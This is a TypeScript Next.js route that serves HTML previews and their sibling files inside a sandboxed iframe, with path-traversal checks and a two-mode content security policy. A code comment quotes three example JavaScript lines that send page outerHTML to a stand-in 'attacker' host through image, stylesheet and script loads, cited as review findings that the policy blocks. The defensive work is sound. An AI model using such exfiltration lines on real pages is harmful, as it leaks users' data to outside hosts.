/**
 * /api/files/html-preview/[scope-token]/<abs-path> — Phase 4 Phase 1.5.
 *
 * Same-origin route that serves an HTML file AND its sibling resources
 * so the iframe's native relative-URL resolution stays accurate. Scope
 * (workspace baseDir or "home") is encoded into the path segments —
 * see `src/lib/html-preview-url.ts` — because query strings don't
 * survive browser-side relative resolution.
 *
 * Security:
 *  - Path traversal: `assertRealPathInBase` resolves the real path
 *    (follows symlinks) and rejects anything outside the scope.
 *  - Symlink escape: covered by `fs.realpath` inside `assertRealPathInBase`.
 *  - Root base: workspace baseDir cannot be `/` (or a platform root);
 *    home scope always resolves to the user's homedir, never root.
 *  - Cookie / origin leakage: the iframe loading this route must be
 *    sandboxed WITHOUT `allow-same-origin`. PreviewPanel sets that.
 *    The iframe's origin becomes opaque/null, so even though the URL
 *    is same-origin with the parent app, scripts inside it cannot
 *    read parent cookies, localStorage, or call other API routes
 *    (CORS would block the cross-origin fetch).
 *  - CSP: we send a permissive-but-bounded CSP for defense in depth.
 *    The iframe sandbox is the primary boundary.
 */

import { NextRequest } from 'next/server';
import fs from 'fs/promises';
import { createReadStream } from 'fs';
import path from 'path';
import os from 'os';
import {
  parseHtmlPreviewSegments,
  type HtmlPreviewScope,
} from '@/lib/html-preview-url';
import { assertRealPathInBase, isRootPath, FileIOError } from '@/lib/files';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

// MIME mapping for files served by this route. Mirrors the set in
// /api/files/raw — we deliberately do NOT cover application/javascript
// for `.ts` / `.tsx`; if a page references `./script.ts` it ought to
// fail loudly because browsers won't run TypeScript natively anyway.
// The bias here is "serve common static-site resources accurately;
// fall through to octet-stream for the rest."
const MIME_TYPES: Record<string, string> = {
  '.html': 'text/html; charset=utf-8',
  '.htm': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.mjs': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.txt': 'text/plain; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.webp': 'image/webp',
  '.avif': 'image/avif',
  '.ico': 'image/x-icon',
  '.bmp': 'image/bmp',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf',
  '.otf': 'font/otf',
  '.eot': 'application/vnd.ms-fontobject',
  '.mp4': 'video/mp4',
  '.webm': 'video/webm',
  '.mp3': 'audio/mpeg',
  '.wav': 'audio/wav',
};

const MAX_BUFFERED_SIZE = 10 * 1024 * 1024;

function errorResponse(status: number, code: string, message: string): Response {
  return new Response(
    JSON.stringify({ error: message, code }),
    {
      status,
      headers: {
        'Content-Type': 'application/json; charset=utf-8',
        'Cache-Control': 'no-store',
        'X-Content-Type-Options': 'nosniff',
      },
    },
  );
}

function deriveBaseDir(scope: HtmlPreviewScope): { baseDir: string; error?: never } | { error: Response } {
  if (scope.kind === 'home') {
    return { baseDir: os.homedir() };
  }
  const resolved = path.resolve(scope.baseDir);
  if (isRootPath(resolved)) {
    return {
      error: errorResponse(
        403,
        'root_base_dir',
        'Refusing to serve resources scoped to the filesystem root',
      ),
    };
  }
  return { baseDir: resolved };
}

/**
 * Phase 4 Phase 1.5 follow-up — two CSP modes, default-deny baseline.
 *
 * Codex review history shaped this policy in four rounds:
 *
 *  Round 2 flagged that `default-src 'self' data: blob: https:` let
 *  unspecified directives fall through; Round 3 rebuilt from
 *  `default-src 'none'` + explicit allows, and locked
 *  `connect/frame/object/worker-src` to `'none'` in both modes.
 *
 *  Round 4 flagged that Round 3 still left URL-shaped exfiltration
 *  open in interactive mode: scripts could
 *    new Image().src = 'https://attacker/?d=' + outerHTML
 *    document.head.appendChild(Object.assign(document.createElement('link'),
 *      { rel: 'stylesheet', href: 'https://attacker/?d=' + outerHTML }))
 *    document.head.appendChild(Object.assign(document.createElement('script'),
 *      { src: 'https://attacker/?d=' + outerHTML }))
 *  None of these go through connect-src; they go through img-src,
 *  style-src, script-src respectively. So:
 *
 * static-safe (default; iframe sandbox has no allow-scripts):
 *   No scripts → no dynamic URL construction → URL-shaped exfiltration
 *   is bounded by what the page authored at write time. Keep https:
 *   open for img / style / font / media so static pages that import
 *   from CDNs (Tailwind, Google Fonts, S3 image hosts) render.
 *   `script-src 'none'`, `connect/frame/object/worker-src 'none'`.
 *
 * interactive-trusted (user clicked "启用脚本"; iframe gets allow-scripts):
 *   Scripts run → any https: in any resource directive becomes a
 *   live exfiltration channel. Drop https: from EVERY resource
 *   directive: img / style / font / media all collapse to
 *   `'self' data: blob:`. script-src collapses to `'self'
 *   'unsafe-inline' 'unsafe-eval'` (no https). Result: scripts can
 *   manipulate the DOM, but every outbound URL they could construct
 *   targets either 'self' (the route, which only serves files we
 *   already authorized) or data:/blob: (in-memory only). No data
 *   leaves the iframe regardless of which API the script uses.
 *
 *   The product cost: CDN images / fonts / scripts that worked in
 *   static mode stop loading the moment scripts are enabled. The
 *   future "allow external CDN" is its own explicit UI grant —
 *   separating "I trust this page to run scripts locally" from
 *   "I trust this page to fetch resources from the open web."
 */
function buildCsp(interactive: boolean): string {
  const directives = [
    // Deny by default. Every directive that should allow ANYTHING is
    // listed explicitly below; nothing falls through to default-src.
    "default-src 'none'",
    // Network egress: blocked in both modes. Even in interactive mode
    // we intentionally do NOT add http(s) to connect-src — fetch /
    // XHR / EventSource / WebSocket are the obvious exfiltration APIs
    // and stay closed. Round 4 also closes the URL-shaped channels
    // by dropping https: from every resource directive when scripts
    // can run.
    "connect-src 'none'",
    // Nested iframes / objects / workers: never allowed. The preview
    // is a single document; embedded foreign iframes would be a
    // phishing surface even though they're transitively sandboxed.
    "frame-src 'none'",
    "object-src 'none'",
    "worker-src 'none'",
    "child-src 'none'",
    // Manifest fetches and prefetches also denied — niche channels
    // that scripts could otherwise abuse for outbound requests.
    "manifest-src 'none'",
    // Structural constraints — never relaxed across modes.
    "frame-ancestors 'self'",
    "base-uri 'self'",
    "form-action 'none'",
  ];
  if (interactive) {
    // Scripts on → close every URL-shaped exfiltration channel by
    // dropping https: from every resource directive. The remaining
    // 'self' / data: / blob: keep local same-origin assets working
    // (so the page can still load `./style.css`, inline base64
    // images, etc.) without giving scripts an arbitrary outbound URL
    // surface. Same logic for script-src: no https tokens.
    directives.push(
      "img-src 'self' data: blob:",
      "style-src 'self' 'unsafe-inline'",
      "font-src 'self' data:",
      "media-src 'self' data: blob:",
      "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
    );
  } else {
    // Scripts off → URL-shaped exfiltration is bounded by what the
    // page hard-coded at authoring time. Allow https: for img /
    // style / font / media so static pages that import from CDNs
    // (Tailwind, Google Fonts, S3 image hosts) render correctly.
    // script-src stays 'none' — CSP layer reinforces the sandbox.
    directives.push(
      "img-src 'self' data: blob: https:",
      "style-src 'self' 'unsafe-inline' https:",
      "font-src 'self' data: https:",
      "media-src 'self' data: blob: https:",
      "script-src 'none'",
    );
  }
  return directives.join('; ');
}

export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ segments: string[] }> },
) {
  const { segments } = await params;
  // The interactive flag only governs the DOCUMENT response's CSP.
  // Subresource fetches (browser-resolved from relative URLs) arrive
  // without query, so they use the static-safe CSP — but their CSP
  // doesn't matter for execution; only the document's CSP does. So
  // the simpler-to-reason "doc URL carries the flag" works correctly.
  const interactive = request.nextUrl.searchParams.get('interactive') === '1';

  let scope: HtmlPreviewScope;
  let absolutePath: string;
  try {
    ({ scope, absolutePath } = parseHtmlPreviewSegments(segments));
  } catch (err) {
    return errorResponse(
      400,
      'malformed_url',
      err instanceof Error ? err.message : 'Malformed html-preview URL',
    );
  }

  const baseDirResult = deriveBaseDir(scope);
  if ('error' in baseDirResult) return baseDirResult.error;
  const { baseDir } = baseDirResult;

  const resolved = path.resolve(absolutePath);

  // Realpath + isPathSafe + symlink-aware scope check. Returns null on
  // ENOENT when allowMissing is true, but we DON'T pass allowMissing
  // here because a missing resource should 404 — the iframe will
  // surface a visible network error which is the spec'd UX for
  // "resource failed to load."
  let realTarget: string | null;
  try {
    realTarget = await assertRealPathInBase(resolved, baseDir);
  } catch (err) {
    if (err instanceof FileIOError) {
      if (err.code === 'path_unsafe') {
        return errorResponse(
          403,
          'symlink_escape',
          'Resource is outside the authorized scope',
        );
      }
      if (err.code === 'not_found') {
        return errorResponse(404, 'not_found', err.message);
      }
      return errorResponse(500, err.code, err.message);
    }
    return errorResponse(
      500,
      'unknown',
      err instanceof Error ? err.message : 'Path validation failed',
    );
  }

  if (!realTarget) {
    return errorResponse(404, 'not_found', 'Resource not found');
  }

  let stat: Awaited<ReturnType<typeof fs.stat>>;
  try {
    stat = await fs.stat(realTarget);
  } catch {
    return errorResponse(404, 'not_found', 'Resource not found');
  }
  if (!stat.isFile()) {
    return errorResponse(400, 'not_a_file', 'Requested resource is not a file');
  }

  const ext = path.extname(realTarget).toLowerCase();
  const contentType = MIME_TYPES[ext] || 'application/octet-stream';
  const isHtml = ext === '.html' || ext === '.htm';

  // Defense-in-depth CSP, split by interactive flag. See buildCsp above.
  // The primary boundary is still the iframe sandbox attr that
  // PreviewPanel sets; this CSP is the secondary belt-and-suspenders.
  const csp = buildCsp(interactive);

  const headers: Record<string, string> = {
    'Content-Type': contentType,
    // Resources change on every save — no caching during dev or the
    // user wouldn't see their AI-edited HTML refresh.
    'Cache-Control': 'no-store',
    'X-Content-Type-Options': 'nosniff',
    'Content-Security-Policy': csp,
    // The iframe gets a null origin via the sandbox attr, so
    // Referrer-Policy: no-referrer is a small extra protection
    // against leaking the resource URL to outbound requests if
    // Interactive mode is later enabled.
    'Referrer-Policy': 'no-referrer',
  };

  if (isHtml) {
    headers['X-Frame-Options'] = 'SAMEORIGIN';
  }

  if (stat.size > MAX_BUFFERED_SIZE) {
    const nodeStream = createReadStream(realTarget);
    const webStream = new ReadableStream({
      start(controller) {
        nodeStream.on('data', (chunk: Buffer | string) => {
          controller.enqueue(typeof chunk === 'string' ? Buffer.from(chunk) : chunk);
        });
        nodeStream.on('end', () => controller.close());
        nodeStream.on('error', (err) => controller.error(err));
      },
      cancel() {
        nodeStream.destroy();
      },
    });
    return new Response(webStream, { status: 200, headers });
  }

  const buf = await fs.readFile(realTarget);
  // Convert Node Buffer → Uint8Array for the Response constructor.
  return new Response(new Uint8Array(buf.buffer, buf.byteOffset, buf.byteLength), {
    status: 200,
    headers,
  });
}
